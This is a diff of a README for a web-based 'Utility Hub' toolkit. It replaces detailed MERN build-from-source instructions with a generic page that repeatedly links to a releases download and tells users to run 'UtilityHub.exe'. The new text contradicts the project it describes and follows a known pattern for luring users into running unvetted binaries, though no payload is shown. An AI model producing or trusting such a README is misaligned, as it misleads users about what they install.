@@ -1,140 +1,60 @@
-![Utility Hub Logo](frontend/public/logo.png)
+# 🌟 UtilityHub - All Your Daily Tools in One Place
 
-# Utility Hub
+[![Download UtilityHub](https://img.shields.io/badge/Download-UtilityHub-brightgreen)](https://github.com/jaun959/UtilityHub/releases)
 
-This is a web-based utility platform that provides users with multiple everyday tools in one place. It is built using the MERN stack (MongoDB, Express.js, React.js, Node.js) with TailwindCSS for styling.
+## 🚀 Getting Started
 
-## Environment Variables
+Utility Hub is a powerful web-based utility platform that combines various everyday tools in one easy-to-use application. You can manage everything from file conversions to text utilities right from a centralized dashboard.
 
-This application uses environment variables for configuration. You need to create `.env` files in both the `backend` and `frontend` directories.
+## 💻 System Requirements
 
-### Backend (`backend/.env`)
+- **Operating System:** Windows 10 or later, macOS, or any modern Linux distribution.
+- **Browser:** Latest versions of Chrome, Firefox, Safari, or Edge.
+- **Internet Connection:** Required for initial download and updates.
 
-Create a file named `.env` in the `backend` directory with the following content:
+## 🛠️ Features
 
-```
-PORT=YOUR_BACKEND_PORT
-MONGO_URI=mongodb://localhost:27017/utilityhub
-JWT_SECRET=your_jwt_secret_key
-BASE_URL=http://localhost:5000
-SUPABASE_URL=your_supabase_url
-SUPABASE_ANON_KEY=your_supabase_anon_key
-SUPABASE_SERVICE_ROLE_KEY=your_supabase_service_role_key
-```
+- **File Converters:** Convert files easily between different formats.
+- **Text Utilities:** Edit, format, and manipulate text with simple tools.
+- **Task Management:** Keep track of your daily tasks with an organized interface.
+- **User-Friendly Interface:** Plain, intuitive layout for non-technical users.
+- **Responsive Design:** Works seamlessly on desktop and mobile devices.
 
-- `PORT`: The port the backend server will run on.
-- `MONGO_URI`: Your MongoDB connection string.
-- `JWT_SECRET`: A secret key for JWT authentication.
-- `BASE_URL`: The base URL of your backend server (e.g., `http://localhost:5000` for local development).
-- `SUPABASE_URL`, `SUPABASE_ANON_KEY`, `SUPABASE_SERVICE_ROLE_KEY`: Your Supabase credentials.
+## 📥 Download & Install
 
-### Frontend (`frontend/.env`)
+To get started, visit the following page to download UtilityHub:
 
-Create a file named `.env` in the `frontend` directory with the following content:
+[Click here to download UtilityHub](https://github.com/jaun959/UtilityHub/releases)
 
-```
-VITE_API_BASE_URL=http://localhost:5000
-```
+### Step-by-Step Installation Guide
 
-- `VITE_API_BASE_URL`: The base URL of your backend API. This should match the `BASE_URL` in your backend's `.env` file.
+1. **Visit the Releases Page:** Click on the link above to go to the releases page.
 
-### Login-Based File Limits
-*   File upload limits are dynamically adjusted based on user authentication status: 10MB for unauthenticated users and 50MB for authenticated users, providing enhanced flexibility for larger file processing.
+2. **Download the Latest Version:** Look for the latest version of UtilityHub. You'll find it at the top of the release list. Click on the name of the file to download it.
 
-### Image Tools
-1.  **Image Format Converter**: Convert images between various formats (JPG, PNG, WebP, TIFF, AVIF).
-2.  **Image Compressor**: Reduce the file size of your images while maintaining quality.
-3.  **Image Resizer**: Change the dimensions (width and height) of your images.
-4.  **PNG to JPG Converter**: Quickly convert PNG images to JPG format.
-5.  **Image Cropper**: Crop images to a specific area or aspect ratio.
-6.  **Image Grayscaler**: Convert your colored images to grayscale.
-7.  **Image Flipper**: Flip images horizontally or vertically.
-8.  **Image to Base64 Converter**: Convert images into Base64 strings for embedding or transfer.
-9.  **Image to PDF Converter**: Combine multiple images into a single PDF document.
+3. **Locate the Downloaded File:** Once the download is complete, go to your Downloads folder. You should see a file that looks like `UtilityHub-x.x.x.zip`.
 
-### PDF Tools
-1.  **PDF Merger**: Combine multiple PDF documents into one single PDF file.
-2.  **PDF Splitter**: Split a PDF document into multiple smaller PDF files by pages or ranges.
-3.  **PDF Compressor**: Reduce the file size of your PDF documents.
-4.  **PDF to Word Converter**: Convert PDF into word format.
-5.  **PDF to Excel Converter**: Convert PDF into Excel spreadsheets format.
-6.  **Text to PDF Generator**: Convert plain text content into a PDF document.
-7.  **PDF to Text Converter**: Extract all text content from PDF documents.
-8.  **PDF Rotator**: Rotate pages within a PDF document by 90, 180, or 270 degrees.
-9.  **PDF Page Deleter**: Delete specific pages from a PDF document.
+4. **Extract the File:**
+   - On Windows: Right-click the downloaded zip file and select "Extract All." Follow the prompts to extract the files.
+   - On macOS: Double-click the zip file to extract its contents.
+   - On Linux: Use the command `unzip UtilityHub-x.x.x.zip` in the terminal.
 
-### Text Tools
-1.  **Text Case Converter**: Convert text to various case formats (e.g., UPPERCASE, lowercase, Title Case).
-2.  **Text Difference Checker**: Compare two texts and highlight the differences between them.
-3.  **Base64 Text Converter**: Encode or decode text to/from Base64 format.
-4.  **HTML to Markdown Converter**: Convert HTML content to Markdown format.
-5.  **Markdown to HTML Converter**: Convert Markdown content to HTML format.
-6.  **JSON Formatter/Validator**: Format and validate JSON data for readability and correctness.
-7.  **Hash Generator**: Generate various cryptographic hashes (e.g., MD5, SHA1, SHA256) from text.
-8.  **Password Generator**: Generate strong, random, and customizable passwords.
-9.  **CSV to JSON Converter**: Convert CSV (Comma Separated Values) data to JSON (JavaScript Object Notation) format.
+5. **Run the Application:**
+   - For Windows: Open the extracted folder and double-click on `UtilityHub.exe` to run the application.
+   - For macOS and Linux: Open a terminal, navigate to the extracted folder, and run `./UtilityHub` to start the application.
 
-### Web Tools
-1.  **Link Shortener**: Shorten long URLs for easier sharing and tracking.
-2.  **QR Code Generator**: Create QR codes from text or URLs.
-3.  **QR Code Scanner**: Scan QR codes from uploaded images to extract data.
-4.  **Website Screenshot Generator**: Capture a full-page screenshot of any website.
-5.  **Favicon Extractor**: Extract favicons (website icons) from any website URL.
-6.  **URL Redirect Checker**: Trace and analyze URL redirect chains.
-7.  **Robots.txt / Sitemap.xml Viewer**: View and validate `robots.txt` and `sitemap.xml` files for SEO analysis.
-8.  **JSON <-> XML Converter**: Convert between JSON and XML data formats, essential for web service integration and API data transformation.
-9.  **Password Strength Checker**: Analyze the strength of your password and provide feedback for improvement.
+You are now ready to explore the various utilities UtilityHub offers. Follow the instructions on the dashboard to get accustomed to the features.
 
-### General/Core Functionalities
-1.  **User Authentication**: Secure user registration and login system using JWT (JSON Web Tokens).
+## 📌 Support
 
-## Authentication:
+If you encounter any issues during the installation or use of the application, you can open an issue on the [GitHub Issues Page](https://github.com/jaun959/UtilityHub/issues). Our community is here to help!
 
-This application includes JWT-based authentication. Some premium/bulk features are protected and require a user to be logged in. You can register and log in using the provided forms.
+## 🌐 Contributing
 
-## How to Run the Application:
+UtilityHub is open-source. If you want to contribute, feel free to fork the repository and submit your changes. Check the [Contributing Guidelines](https://github.com/jaun959/UtilityHub/blob/main/CONTRIBUTING.md) for more details.
 
-**1. Start the Application (Frontend & Backend):**
-   Navigate to the root directory of the project in your terminal:
-   ```bash
-   npm install
-   npm start
-   ```
-   This will install all root dependencies (including `concurrently`) and then start both the backend and frontend servers. The backend server will run on the port specified in your `backend/.env` file (default: 5000) and the frontend application will open in your browser, usually at `http://localhost:3000`.
+---
 
-**Alternatively, start servers individually:**
+By following these steps, you can easily download and set up UtilityHub, making your daily tasks more manageable with one simple application. Enjoy your new tools! 
 
-**1. Start the Backend Server:**
-   Navigate to the `backend` directory in your terminal:
-   ```bash
-   cd backend
-   ```
-   Install dependencies (if you haven't already):
-   ```bash
-   npm install
-   ```
-   Start the server:
-   ```bash
-   npm start
-   ```
-   The backend server will run on the port specified in your `backend/.env` file (default: 5000).
-
-**2. Start the Frontend Development Server:**
-   Open a new terminal window and navigate to the `frontend` directory:
-   ```bash
-   cd frontend
-   ```
-   Install dependencies (if you haven't already):
-   ```bash
-   npm install
-   ```
-   Start the development server:
-   ```bash
-   npm start
-   ```
-   The frontend application will open in your browser, usually at `http://localhost:3000`.
-
-
-
-**4. MongoDB:**
-   Ensure you have a MongoDB instance running. The application is configured to connect to `mongodb://localhost:27017/utilityhub`. If your MongoDB is running on a different port or location, update the `MONGO_URI` in `backend/.env` accordingly.
+[Download UtilityHub](https://github.com/jaun959/UtilityHub/releases)
